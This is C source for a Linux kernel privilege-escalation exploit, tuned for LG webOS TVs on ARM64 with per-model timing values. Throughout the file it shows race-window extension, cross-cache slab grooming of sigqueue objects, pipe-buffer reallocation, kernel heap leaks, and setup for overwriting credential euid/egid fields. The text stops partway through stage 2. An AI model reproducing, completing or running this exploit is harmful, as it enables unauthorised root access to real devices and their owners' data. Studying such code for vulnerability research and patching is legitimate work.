#define _GNU_SOURCE
#include <time.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdlib.h>
#include <err.h>
#include <sys/prctl.h>
#include <sched.h>
#include <linux/membarrier.h>
#include <sys/syscall.h>
#include <sys/signalfd.h>
#include <poll.h>
#include <errno.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <linux/futex.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define SYSCHK(x) ({            \
    typeof(x) __res = (x);      \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res;                      \
})

#define PAGE_SIZE 0x1000uLL

static inline int is_kernel_ptr(size_t val) {
    return val > 0xffff000000000000ULL && val != 0xffffffffffffffffULL;
}

// For winning the races and extending
// the race windows
#define NUM_SAMPLES 100000
#define NUM_TIMERS 18
#define ONE_MS_NS 1000000uLL
#define SYSCALL_LOOP_TIMES_MAX 300
// Waitqueue entries extend the race window. More = better chance but more memory.
// Original: 500*100*2 = 100,000 entries (caused "No space left on device" on webOS)
// 250*60*2 = 30,000 entries (working, Stage 2 reliable, only exhausts in Stage 4)
#define EPOLL_COUNT 250
#define SFD_DUP_COUNT 60

// For synchronization between parent and child
#define SUCCESS_CHAR 's'
#define FAIL_CHAR 'f'
#define SUCCESS_STR "s"
#define FAIL_STR "f"

// The following variables are target dependent. Some benchmarking can
// be done from userland beforehand so that these variables aren't
// needed, but just for this exploit, I manually set them to values
// that work for me. You'll have to figure them out yourself.
//
// WebOS-specific tuning (LG webOS 5.4.268-320, ARM64, 4 cores):
// These values are starting points for webOS and will likely need adjustment.
// ARM64 CPUs typically have different timing characteristics than x86_64.
// Start with these conservative values and adjust based on "raced too late/early" messages.

// Known Good Values for PARENT_SETTIME_DELAY_US:
// OLED65C2PUA (HE_DTV_W22O_AFABATPU) - 29700
// 86QNED70AUA (HE_DTV_W25P_AFADATAA) - 100000
// OLED77C5PUA (HE_DTV_W25G_AFABATAA) - 30500 
// OLEDG477 HE_DTV_W24O_AFABATAA - 24500
// Others must be determined by testing.

// Compile-time defaults (overridable via command-line args)
#ifdef __aarch64__
#define DEFAULT_PARENT_SETTIME_DELAY_US 31000  // Tuned for 250*60*2=30k waitqueue entries (working config)
#define DEFAULT_PARENT_SETTIME_DELAY_US_DELTA 50   // Approx DEFAULT_PARENT_SETTIME_DELAY_US / 600
#define DEFAULT_CPU_USAGE_THRESHOLD 3000
#else
#define DEFAULT_PARENT_SETTIME_DELAY_US 22000  // Original x86_64 values
#define DEFAULT_PARENT_SETTIME_DELAY_US_DELTA 50
#define DEFAULT_CPU_USAGE_THRESHOLD 22000
#endif

// Runtime values (set in main() from args or defaults)
int PARENT_SETTIME_DELAY_US;
int PARENT_SETTIME_DELAY_US_DELTA;
int CPU_USAGE_THRESHOLD;

/* Global variables for exploit setup START */

// Thread synchronization in child process
pthread_barrier_t barrier;

// Timers used to stall `handle_posix_cpu_timers()` to extend the race window
timer_t stall_timers[NUM_TIMERS];

// Thread that will trigger the timer handling, and also the thread that will
// be reaped by the exploit parent process
pthread_t race_thread;

int exploit_child_to_parent[2];
int exploit_parent_to_child[2];
int sigusr1_sfds[SFD_DUP_COUNT]; // signalfd for increasing race window
int sigusr2_sfds[SFD_DUP_COUNT]; // signalfd for detecting the UAF later.

// Amount of LESS times to loop the `getpid()` syscall to waste CPU time
int syscall_loop_times = 0;
int race_retry_count = 0; // For debugging purposes
pid_t exploit_child_pid, exploit_parent_pid;

// BIG NOTE: The very first timer created by a process actually gets timer ID 0,
// so checking for NULL here is not good enough to figure out whether a timer was
// allocated or not.
//
// Instead, set these to -1, and check for -1 later.
timer_t uaf_timer = (void *) -1, realloc_timer = (void *) -1; // The UAF timer handlers

/* Global variables for exploit setup END */

/* Global variables for cross-cache START */

// `sigqueue_cachep` related constants.
// NOTE FOR webOS ARM64:
// These values may be incorrect! struct sigqueue on ARM64 is likely ~160 bytes, not 80.
// If cross-cache fails (buffer is empty), try:
//   SIGQUEUE_obj_size = 160
//   SIGQUEUE_objs_per_slab = 25 (4096/160)
// If you see data at unexpected offsets, SIGQUEUE_obj_size is wrong.
#define SIGQUEUE_objs_per_slab 51
#define SIGQUEUE_cpu_partial 30
#define SIGQUEUE_slab_count 33  // Stage 2 cross-cache (33*51=1683 timers, needed for reliability)
#define SIGQUEUE_obj_size 80

// `struct sigqueue` layout on ARM64 (from linux-rockhopper/include/linux/signal_types.h):
//
// struct sigqueue {
//     struct list_head list;       // offset 0x00, size 16 (two 8-byte pointers)
//     int flags;                   // offset 0x10, size 4
//     // 4 bytes padding           // offset 0x14 (align kernel_siginfo_t to 8)
//     kernel_siginfo_t info;       // offset 0x18 (24)
//         si_signo (int)           //   info+0x00 = offset 0x18
//         si_errno (int)           //   info+0x04 = offset 0x1C
//         si_code (int)            //   info+0x08 = offset 0x20
//         // padding               //   info+0x0C
//         union __sifields         //   info+0x10 = offset 0x28
//     struct user_struct *user;    // offset 0x48 (72), size 8
// };
//
// Total size: 80 bytes (matches SIGQUEUE_obj_size)
//
#define SIGQUEUE_PREALLOC 1
#define SIGQUEUE_list_next_offset 0x00
#define SIGQUEUE_list_prev_offset 0x08
#define SIGQUEUE_flags_offset 0x10
#define SIGQUEUE_info_si_signo_offset 0x18  // kernel_siginfo_t.si_signo
#define SIGQUEUE_user_offset 0x48

// `cred_jar` and `struct cred` related constants.
// ARM64 without CONFIG_DEBUG_CREDENTIALS (confirmed from LG webOS kernel source):
//   offset 0: atomic_long_t usage (8 bytes)
//   offset 8: kuid_t uid, kgid_t gid, kuid_t suid, kgid_t sgid (4 bytes each)
//   offset 24: kuid_t euid (4 bytes) ← target
//   offset 28: kgid_t egid (4 bytes) ← target
#ifdef __aarch64__
#define CRED_JAR_slab_size 192
#define CRED_JAR_euid_offset 24
#define CRED_JAR_egid_offset 28
#else
#define CRED_JAR_slab_size 192
#define CRED_JAR_euid_offset 20
#define CRED_JAR_egid_offset 24
#endif

// This list holds the timers used for cross-caching (both times).
timer_t cross_cache_timers[SIGQUEUE_slab_count][SIGQUEUE_objs_per_slab];

/* Global variables for cross-cache END */

/* Global variables for second stage START */

int parent_owns_uaf_sigqueue = 0; // Does the parent or child have the UAF sigqueue?
pid_t buggy_pid = 0; // Parent / child process PID based on above

/* Global variables for second stage END */

void pin_on_cpu(int i) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

static inline long long ts_to_ns(const struct timespec *ts) {
    return (long long)ts->tv_sec * 1000000000LL + (long long)ts->tv_nsec;
}

// Helper function to fully drain a signalfd.
//
// WARNING!!!! THIS FUNCTION IS AI GENERATED!!! DO NOT USE XD
int drain_signalfd(int sfd) {
    int sig_count = 0;
    for (;;) {
        struct signalfd_siginfo si;
        ssize_t n = read(sfd, &si, sizeof(si));
        if (n > 0) { sig_count++; continue; }    // drained some; keep going
        if (n == -1 && errno == EAGAIN) break;   // fully drained
        if (n == -1 && errno == EINTR) continue; // interrupted; retry
    }

    return sig_count;
}

static inline size_t rdtsc_begin(void)
{
#if defined(__aarch64__)
  // ARM64: Read virtual counter (CNTVCT_EL0)
  size_t val;
  asm volatile("mrs %0, cntvct_el0" : "=r" (val));
  return val;
#else
  size_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("lfence");
  return a;
#endif
}

static inline size_t rdtsc_end(void)
{
#if defined(__aarch64__)
  // ARM64: Read virtual counter (CNTVCT_EL0)
  size_t val;
  asm volatile("mrs %0, cntvct_el0" : "=r" (val));
  return val;
#else
  size_t a, d;
  asm volatile ("lfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
#endif
}

// This function measures the average CPU time consumption of the `getpid()` syscall.
//
// Can overflow if `NUM_SAMPLES` is too high, but with simple syscalls,
// this works just fine.
//
// Can also actually return 0 if some weird scheduler behavior occurs and causes
// the `total_nsec` to overflow, so ensure to check for that when calling it.
//
// Also, very important to be pinned to one CPU before running this!
long int getpid_cpu_usage() {
    // Use clock_gettime approach for accurate nanosecond timing (like profiler.c)
    const int samples = 10000;
    struct timespec *ts = malloc(samples * sizeof(struct timespec));
    
    // First, measure clock_gettime overhead
    static long int clock_overhead = 0;
    if (clock_overhead == 0) {
        for (int i = 0; i < samples; i++) {
            syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        }
        long int total = 0;
        for (int i = 0; i < samples - 1; i++) {
            total += (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]));
        }
        clock_overhead = total / (samples - 1);
    }
    
    // Now measure getpid() time
    for (int i = 0; i < samples; i++) {
        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        syscall(__NR_getpid);
    }
    
    long int total = 0;
    for (int i = 0; i < samples - 1; i++) {
        long int delta = (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i])) - clock_overhead;
        if (delta > 0) total += delta;
    }
    
    free(ts);
    long int avg = total / (samples - 1);
    
    // Only print once
    static int printed = 0;
    if (!printed) {
        printf("[*] getpid() timing: %ld ns\n", avg);
        fflush(stdout);
        printed = 1;
        // if (avg < 135 || avg > 170) {
        //     printf("[!] getpid() timing out of expected range (135-170 ns), got %ld ns. Exiting.\n", avg);
        //     printf("[!] You need to re-run the exploit!\n");
        //     exit(1);
        // }
    }
    
    return avg;
}

// Helper function to read from the reallocated pipe buffer data page.
//
// Reads `size` bytes at offset `offset` out of the pipe and return it in `buf`.
//
// NOTES: 
// - `buf` is assumed to be at least PAGE_SIZE bytes large.
// - The pipe is assumed to be readable (i.e write_pipe() was
//   already called before this).
void read_pipe(int pfds[2], size_t size, size_t offset, char *buf) {
    size_t ret = 0;

    if (size > PAGE_SIZE) {
        printf("read_pipe: size too big\n");
        SYSCHK(-1);
    }

    // Read up to offset first, then read size bytes
    ret = SYSCHK(read(pfds[0], buf, offset));
    if (ret != offset) {
        printf("read_pipe: offset read failed, offset %ld read %ld\n", offset, ret);
        SYSCHK(-1);
    }
    SYSCHK(read(pfds[0], buf, size));
}

// Helper function to read from the reallocated pipe buffer data page.
//
// Writes `size` bytes out of `buf` into the pipe at offset `offset`.
//
// NOTES:
// - `buf` is assumed to be at least PAGE_SIZE bytes large.
// - This will clobber all data before offset.
// TODO:
void write_pipe(int pfds[2], size_t size, size_t offset, void *buf) {
    size_t ret = 0;
    if (size > PAGE_SIZE) {
        printf("write_pipe: size too big\n");
        SYSCHK(-1);
    }

    // Write up to offset first, then write the data
    char zero_buf[offset];
    memset(zero_buf, 0, offset);
    ret = SYSCHK(write(pfds[1], zero_buf, offset));
    if (ret != offset) {
        printf("write_pipe: offset write failed, offset %ld wrote %ld\n", offset, ret);
        SYSCHK(-1);
    }

    ret = SYSCHK(write(pfds[1], buf, size));
    if (ret != size) {
        printf("write_pipe: size write failed, size %ld wrote %ld\n", size, ret);
        SYSCHK(-1);
    }
}

// Non-destructive read of pipe buffer data using tee().
// Copies data to a temp pipe via tee() (which does NOT consume the source pipe's
// buffer), then reads from the temp pipe. The source pipe's page reference is
// preserved, so the physical page is NOT freed.
//
// This is critical for cross-cache exploits: if we used read_pipe(), the pipe
// would release the backing page, and a subsequent write_pipe() would allocate
// a DIFFERENT physical page. The kernel's UAF pointer still references the
// ORIGINAL page, so modifications on the new page would be invisible to the kernel.
void peek_pipe(int pfds[2], size_t size, char *buf) {
    int temp_pipe[2];
    SYSCHK(pipe(temp_pipe));

    // tee() duplicates pipe data without consuming the source
    ssize_t teed = tee(pfds[0], temp_pipe[1], size, 0);
    if (teed <= 0) {
        printf("peek_pipe: tee() returned %zd, errno=%d\n", teed, errno);
        close(temp_pipe[0]);
        close(temp_pipe[1]);
        SYSCHK(-1);
    }

    // Read from the temp pipe (releases temp pipe's page ref, source pipe keeps its ref)
    ssize_t rd = SYSCHK(read(temp_pipe[0], buf, teed));
    if (rd != teed) {
        printf("peek_pipe: read() returned %zd, expected %zd\n", rd, teed);
    }

    // Zero any remaining bytes if tee returned less than requested
    if ((size_t)teed < size) {
        memset(buf + teed, 0, size - teed);
    }

    close(temp_pipe[0]);
    close(temp_pipe[1]);
}

// This function pre-allocates sigqueues very carefully for cross-caching (both times).
//
// NOTE: Ensure you are on the correct CPU before calling this function!
void sigqueue_crosscache_preallocs() {
    // ---------------------------------------------------------------------------------
    // 
    // NOTE: On a real android device, a bunch of sigqueues should be allocated first
    // so that all slab pages from per cpu partial lists, per node partial lists, etc
    // are used up. This can be done by just spamming real-time signals to some process
    // that's blocking them.
    //
    // I won't be doing that here, just going to assume this is being ran in QEMU on a
    // clean setup where the sigqueue cache's slab pages will not be on any per-cpu
    // or per-node partial lists.
    //
    // ---------------------------------------------------------------------------------
    //
    // Goal: get our UAF timer in the middle of slab 3.
    struct sigevent cross_cache_evt = {0};
    cross_cache_evt.sigev_notify = SIGEV_NONE;
    
    // Allocate full slabs 1 and 2.
    for (int i = 0; i < 2; i++) {
        for (int j = 0; j < SIGQUEUE_objs_per_slab; j++) {
            SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &cross_cache_evt, &cross_cache_timers[i][j]));
        }
    }

    // Allocate 25 objects in slab 3
    for (int i = 0; i < 25; i++) {
        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &cross_cache_evt, &cross_cache_timers[2][i]));
    }
    
    // Next allocation will be the sigqueue whose slab will be cross-cached.
}

// This function post-allocates sigqueues very carefully for cross-caching (both times).
//
// NOTE: Ensure you are on the correct CPU before calling this function!
void sigqueue_crosscache_postallocs() {
    struct sigevent cross_cache_evt = {0};
    cross_cache_evt.sigev_notify = SIGEV_NONE;

    // We have a freed sigqueue at the head of the freelist of slab 3 right now. Re-allocate
    // it plus the remaining 25 objects in that slab now.
    //
    // You can use this special value with a kernel patch to figure out where it's allocated.
    // This should reallocate on top of whatever sigqueue we are attempting to cross-cache. If
    // it doesn't, there's a bug in this exploit!
    // cross_cache_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL;
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &cross_cache_evt, &cross_cache_timers[2][25]));
    cross_cache_evt.sigev_value.sival_ptr = (void *)0; // reset if it was set
    
    // Allocate the remaining 25 objects in slab 3.
    for (int i = 26; i < SIGQUEUE_objs_per_slab; i++) {
        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &cross_cache_evt, &cross_cache_timers[2][i]));
    }

    // Allocate sigqueues for the remaining slabs.
    for (int i = 3; i < SIGQUEUE_slab_count; i++) {
        for (int j = 0; j < SIGQUEUE_objs_per_slab; j++) {
            SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &cross_cache_evt, &cross_cache_timers[i][j]));
        }
    }
}

// This function frees the slab 3 page back to the page allocator by very
// carefully freeing sigqueues in the `cross_cache_timers` list.
void free_crosscache_sigqueues() {
    // Now, the target sigqueue should be in the middle of slab 3.
    //
    // Strategically free sigqueues to fill up the per-cpu partial list, but also
    // ensure that the target sigqueue's slab is fully freed before freeing the 32nd slab.
    //
    // Start by freeing the first and last object in slab 1.
    // NOTE: Don't use SYSCHK - timers may already be freed by cleanup or second cross-cache
    timer_delete(cross_cache_timers[0][0]);
    timer_delete(cross_cache_timers[0][SIGQUEUE_objs_per_slab-1]);

    // Now, free the first, and then objects 26 through 51 in slab 2.
    timer_delete(cross_cache_timers[1][0]);
    for (int i = 25; i < SIGQUEUE_objs_per_slab; i++) {
        timer_delete(cross_cache_timers[1][i]);
    }

    // Free all objects in slab 3
    for (int i = 0; i < SIGQUEUE_objs_per_slab; i++) {
        timer_delete(cross_cache_timers[2][i]);
    }

    // Free objects 1 through 25 in slab 4
    for (int i = 0; i < 25; i++) {
        timer_delete(cross_cache_timers[3][i]);
    }

    // For the remaining slabs up to `cpu_partial` (inclusive), free the first and last obj
    for (int i = 4; i < SIGQUEUE_cpu_partial+1; i++) {
        timer_delete(cross_cache_timers[i][0]);
        timer_delete(cross_cache_timers[i][SIGQUEUE_objs_per_slab-1]);
    }

    // Now, freeing one object from the `cpu_partial+1`th slab should trigger
    // `unfreeze_partials()`, which will move fully freed slabs (i.e slab 3) to
    // the page allocator. 
    //
    // Free first and last sigqueue here just in case the first one is in the 
    // slab overlapped with the previous index.
    timer_delete(cross_cache_timers[SIGQUEUE_cpu_partial+1][0]);
    timer_delete(cross_cache_timers[SIGQUEUE_cpu_partial+1][SIGQUEUE_objs_per_slab-1]);
}

void cleanup_crosscache_sigqueues() {
    // In this case, we can just timer_delete() every single timer without
    // checking for errors. If they exist, they will be deleted. Otherwise,
    // we'll see an error.
    for (int i = 0; i < SIGQUEUE_slab_count; i++) {
        for (int j = 0; j < SIGQUEUE_objs_per_slab; j++) {
            timer_delete(cross_cache_timers[i][j]);
        }
    }
}

// This is the function responsible for triggering `handle_posix_cpu_timers()`.
void race_func(void) {
    // Pin to same CPU as the `free_func()` thread. This is the first cross-cache
    // CPU.
    pin_on_cpu(3);

    // For the race condition trigger
    struct sigevent race_evt = {0};
    race_evt.sigev_notify = SIGEV_SIGNAL;
    race_evt.sigev_signo = SIGUSR1;

    // For the UAF timer
    struct sigevent uaf_evt = {0};
    uaf_evt.sigev_notify = SIGEV_SIGNAL;
    uaf_evt.sigev_signo = SIGUSR1; // SIGUSR1 for now
    // uaf_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL; // Detect this UAF timer

    prctl(PR_SET_NAME, "RACER");
    // prctl(PR_SET_NAME, "REAPEE"); // KERNEL PATCH: 500ms delay with this

    // Send this thread's TID to the parent process, so the parent can attach to us.
    pid_t tid = (pid_t)syscall(SYS_gettid);
    SYSCHK(write(exploit_child_to_parent[1], &tid, sizeof(pid_t))); // sync 1

    // Get the average CPU time usage of the `getpid()` syscall, so we
    // can use it for the trigger later
    long int getpid_avg = 0;

    // `getpid_cpu_usage()` can technically return 0, it's very rare but
    // if it does, just recalculate.
    while (getpid_avg == 0) {
        getpid_avg = getpid_cpu_usage();
    }

    // Wait for parent to attach and continue us.
    pthread_barrier_wait(&barrier); // barrier 1

    // Create the UAF timer on the first cross-cache CPU.
    //
    // NOTE: This must be the last timer created on this CPU's active slab! Because we will
    //       free it and re-allocate over it in `free_func()`.
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &uaf_evt, &uaf_timer));

    // Switch the pinned CPU after creating the UAF timer. This is important because
    // `free_func()` must be able to run concurrently to this, and we also don't want to
    // touch the active CPU slab of the cross-cache CPU!
    pin_on_cpu(2);

    // Create the remaining stall timers for extending the race window
    for (int i = 0; i < NUM_TIMERS; i++) {
        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_evt, &stall_timers[i]));
    }

    // Wait for the main thread to arm the timers. This is to make sure
    // this thread does not use CPU time to arm the timers.
    pthread_barrier_wait(&barrier); // barrier 2 - wake up main thread
    pthread_barrier_wait(&barrier); // barrier 3 - wait for armed timers

    // Waste just the right amount of CPU time now without firing any of the timers.
    //
    // The logic here is that calling `getpid()` enough times to consume 1 ms of CPU time,
    // and then adding a threshold amount of times on top of that will ensure that the timers
    // fire BEFORE `do_exit()` is called.
    //
    // Then, subtract `syscall_loop_times` (which changes on each retry) to slowly reduce the
    // amount of CPU time being consumed, until the timers fire right after `exit_notify()` wakes
    // up the parent exploit process.
    //
    // Use a print statement in `free_func()` when it receives SIGUSR1 to figure out how often
    // the timers are firing, and adjust CPU_USAGE_THRESHOLD accordingly so that it fires sometimes,
    // but not every time.
    long int loop_count = ((ONE_MS_NS / getpid_avg) + CPU_USAGE_THRESHOLD - syscall_loop_times);
    for (int i = 0; i < loop_count; i++) {
        syscall(__NR_getpid);
    }

    // This `return` will trigger `do_exit()` in the kernel. The goal is for a scheduler interrupt
    // to occur and `handle_posix_cpu_timers()` to run after `exit_notify()` wakes up the parent
    // exploit process that called `waitpid()` on us.
    return;
}

void free_func(void) {
    pin_on_cpu(3);
    prctl(PR_SET_NAME, "FREE_FUNC");
    
    // Set up a poll for SIGUSR1. As soon as we receive it, we know
    // we're in the race window.
    struct pollfd pfd = { 
        .fd = sigusr1_sfds[0],          
        .events = POLLIN 
    };

    // Poll for SIGUSR1.
    for (;;) {
        int ret = poll(&pfd, 1, 0);

        // Got SIGUSR1 from the first stall timer, in race window now.
        if (pfd.revents & POLLIN) {
            // CRITICAL: Drain ONE signal and timer_delete IMMEDIATELY - no barrier!
            //
            // We must do both operations as fast as possible because the racer
            // thread is exiting. When it exits, exit_process_timers will free
            // our k_itimer. If we delay (e.g., with a barrier wait), the kernel
            // frees the timer before we can call timer_delete, causing EINVAL.
            //
            // Drain only ONE signal (the UAF timer's) - not all signals!
            // This leaves other timers' signals for the main loop to count.
            // The dequeue performs list_del_init, emptying the UAF sigqueue's list.
            // Then timer_delete finds list_empty and frees the sigqueue.
            struct signalfd_siginfo si_drain;
            read(sigusr1_sfds[0], &si_drain, sizeof(si_drain));

            // Free the timer on CPU 3. This must happen IMMEDIATELY after drain.
            SYSCHK(timer_delete(uaf_timer));

            // Immediately switch pinned CPU to 0 and wake up the parent exploit process.
            pin_on_cpu(0);
            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // sync 4.SUCCESS
            break;
        }

        // Spurious wake-up check
        if (ret < 0 && errno == EINTR)
            continue;

        // Some unknown error occurred, pause to debug
        if (ret < 0) {
            perror("free_func poll");
            getchar();
            break;
        }
    }
}

// Stage 2 starts after:
//
// 1. The UAF sigqueue is freed.
// 2. We still have a handle to in either the parent or child's pending list.
// 3. The UAF sigqueue's pointers should point back to itself, making it
//    non-dequeueable by default.
void second_stage_exploit() {
    struct signalfd_siginfo si;
    char m;
    
    // Create a signalfds for all three signals we need to dequeue later.
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR2); // signal used by UAF sigqueue
    int sigusr2_sfd = SYSCHK(signalfd(-1, &mask, SFD_CLOEXEC | SFD_NONBLOCK));
    sigemptyset(&mask);
    sigaddset(&mask, SIGRTMIN+1); // signal used by other sigqueue
    int sigrt1_sfd = SYSCHK(signalfd(-1, &mask, SFD_CLOEXEC | SFD_NONBLOCK));
    sigemptyset(&mask);
    sigaddset(&mask, SIGRTMIN+2); // signal used for leaking task pending list addr
    int sigrt2_sfd = SYSCHK(signalfd(-1, &mask, SFD_CLOEXEC | SFD_NONBLOCK));
    
    // Prepare the buffer used by the reallocated pipe buffer data page.
    char buf[PAGE_SIZE];
    memset(buf, 0, PAGE_SIZE);

    // Just double confirm we are pinned to the right cross-cache CPU.
    pin_on_cpu(3);

    printf("\n[+] Stage 2 - Cross-cache the UAF sigqueue's slab\n");

    // Allocate the rest of the sigqueues for cross-cache
    sigqueue_crosscache_postallocs();

    // Allocate a pipe for the pipe buffer data page later, and make it
    // non-blocking for error checking too.
    int realloc_pipefds[2];
    SYSCHK(pipe(realloc_pipefds));

    // Read end non-blocking
    int flags = fcntl(realloc_pipefds[0], F_GETFL, 0);
    SYSCHK(fcntl(realloc_pipefds[0], F_SETFL, flags | O_NONBLOCK));

    // Write end non-blocking
    flags = fcntl(realloc_pipefds[1], F_GETFL, 0);
    SYSCHK(fcntl(realloc_pipefds[1], F_SETFL, flags | O_NONBLOCK));

    // Now free the UAF sigqueue's page back to the page allocator.
    free_crosscache_sigqueues();

    // Realloc UAF sigqueue as a pipe buffer page immediately after it's freed.
    // This is done by writing to the pipe.
    ssize_t wrote = SYSCHK(write(realloc_pipefds[1], buf, PAGE_SIZE));
    if (wrote != PAGE_SIZE) {
        printf("\t[!] WARNING: short write to realloc pipe: %zd/%llu bytes\n",
               wrote, (unsigned long long)PAGE_SIZE);
    }

    printf("\t[+] Reallocated UAF sigqueue slab as a pipe buffer data page\n");
    printf("\t[+] Cleaning up all cross-cache allocations to prepare for next cross-cache\n");
    
    // We will be cross-caching again very soon, so free all other cross-cache sigqueues.
    // NOTE: do this on the same CPU as the first cross-cache.
    cleanup_crosscache_sigqueues();

    printf("\t[+] Preparing task pending list for heap leaks\n");

    // Switch CPUs to start on a clean slate for the second cross-cache.
    pin_on_cpu(2);

    // Do the preallocs same as before.
    sigqueue_crosscache_preallocs();

    // Send a new signal to the process to fill in the UAF sigqueue's next pointer.
    // Use `tkill()` as that uses the task's pending list. `kill()` uses the
    // shared pending list instead.
    //
    // This sigqueue is allocated after the preallocs.
    SYSCHK(syscall(__NR_tkill, buggy_pid, SIGRTMIN+1));

    // Before dequeueing the SIGRTMIN+2 signal, switch back to a non-cross-cache CPU.
    //
    // This is because this signal was prepared on a non-cross-cache CPU in the first
    // place, and we aren't using it in the cross-cache, so in order to not mess with
    // the cross-cache, we have to free it on a different CPU.
    pin_on_cpu(1);

    // NOTE: If the `buggy_pid` points to the child process, we have to ask the
    //       child process to dequeue the signal for us.
    if (parent_owns_uaf_sigqueue) {
        // Dequeueing this signal will put the pointer of our task struct's pending list
        // into the ->prev pointer of the UAF sigqueue.
        SYSCHK(read(sigrt2_sfd, &si, sizeof(si)));
    } else {
        // Child will dequeue the signal for us. Wait for it to finish.
        SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // stage 2 - sync 2
        SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // stage 2 - sync 3
    }

    // Now switch back to the second cross-cache CPU
    pin_on_cpu(2);

    // Use peek_pipe (tee-based) to read the pipe buffer WITHOUT releasing the page.
    // This is critical: read_pipe would release the backing page, and a subsequent
    // write_pipe would allocate a DIFFERENT physical page. The kernel's signal list
    // still points to the ORIGINAL page, so we must keep it alive.
    peek_pipe(realloc_pipefds, PAGE_SIZE, buf);

    // Debug: dump first non-zero qwords to diagnose cross-cache success
    printf("\t[DEBUG] Pipe buffer page dump (non-zero qwords):\n");
    int dump_count = 0;
    for (size_t i = 0; i < PAGE_SIZE && dump_count < 16; i += 8) {
        size_t val = *((size_t *)(buf + i));
        if (val != 0) {
            printf("\t[DEBUG]   offset 0x%03lx: 0x%016lx%s\n", i, val,
                   is_kernel_ptr(val) ? " [kernel ptr]" : "");
            dump_count++;
        }
    }
    if (dump_count == 0) {
        printf("\t[DEBUG]   Page is ALL ZEROS - cross-cache likely failed!\n");
    }
    fflush(stdout);

    size_t other_sigqueue_addr = 0;
    size_t task_pending_list_addr = 0;
    size_t uaf_sigqueue_offset = 0;

    // Scan at 8-byte alignment for the first pair of consecutive kernel pointers.
    // These are the UAF sigqueue's list.next (other_sigqueue_addr) and list.prev
    // (task_pending_list_addr). No strict field matching is possible because the
    // pipe write zeroed flags and si_signo.
    for (size_t i = 0; i < PAGE_SIZE - 16; i += 8) {
        size_t val = *((size_t *)(buf + i));
        size_t next_val = *((size_t *)(buf + i + 8));

        if (!is_kernel_ptr(val) || !is_kernel_ptr(next_val))
            continue;

        // list.next and list.prev must be different addresses (one points to
        // other_sigqueue, the other to the task pending list head)
        if (val == next_val)
            continue;

        other_sigqueue_addr = val;
        uaf_sigqueue_offset = i;
        task_pending_list_addr = next_val;
        break;
    }

    if (other_sigqueue_addr != 0 && (uaf_sigqueue_offset % SIGQUEUE_obj_size) != 0) {
        printf("\t[!] WARNING: uaf_sigqueue_offset 0x%lx not aligned to obj_size %d\n",
               uaf_sigqueue_offset, SIGQUEUE_obj_size);
        other_sigqueue_addr = 0;
        task_pending_list_addr = 0;
        uaf_sigqueue_offset = 0;
    }

    if (other_sigqueue_addr != 0 && (task_pending_list_addr & 0x7) != 0) {
        printf("\t[!] WARNING: task_pending_list_addr not 8-byte aligned: 0x%lx\n",
               task_pending_list_addr);
        other_sigqueue_addr = 0;
        task_pending_list_addr = 0;
        uaf_sigqueue_offset = 0;
    }

    if (other_sigqueue_addr != 0) {
        printf("\t[+] Heap leaks:\n");
        printf("\t\t- UAF sigqueue page offset 0x%lx\n", uaf_sigqueue_offset);
        printf("\t\t- Other sigqueue 0x%lx\n", other_sigqueue_addr);
        printf("\t\t- Task pending list addr 0x%lx\n", task_pending_list_addr);
    }

    // =========================================================================
    // KEY CHANGE: Do NOT dequeue SIGUSR2 here!
    //
    // Keep SIGUSR2 pending so the UAF sigqueue stays in the pending list.
    // We'll use it later for the arbitrary write primitive.
    //
    // The pending list is currently:
    //   head -> UAF(SIGUSR2) -> other(SIGRTMIN+1) -> head
    //
    // We don't need uaf_sigqueue_addr because we'll place the fake cred
    // at other_sigqueue_addr (which we already know).
    // =========================================================================

    // NOTE: No write_pipe needed - peek_pipe kept the original page in the pipe.

    // If heap leak failed, bail out and retry from Stage 1
    if (other_sigqueue_addr == 0) {
        printf("\t[!] Heap leak failed, retrying from Stage 1...\n");
        fflush(stdout);
        return;
    }

    printf("\t[+] Heap leak successful! Continuing...\n");
    printf("\t[+] SIGUSR2 kept pending - UAF sigqueue stays in list\n");
    fflush(stdout);

    // Dequeue SIGRTMIN+1 to free other_sigqueue back to its slab freelist.
    // The kernel traverses: head -> UAF(si_signo=0, skip) -> other(SIGRTMIN+1, match!)
    // list_del_init on other_sigqueue updates UAF.next = head (task_pending_list_addr)
    //
    // After this, the list is: head -> UAF(SIGUSR2) -> head
    //
    // NOTE: If the `buggy_pid` points to the child process, we have to ask the
    //       child process to dequeue the signal for us.
    if (parent_owns_uaf_sigqueue) {
        SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
    } else {
        SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // stage 2 - sync 4
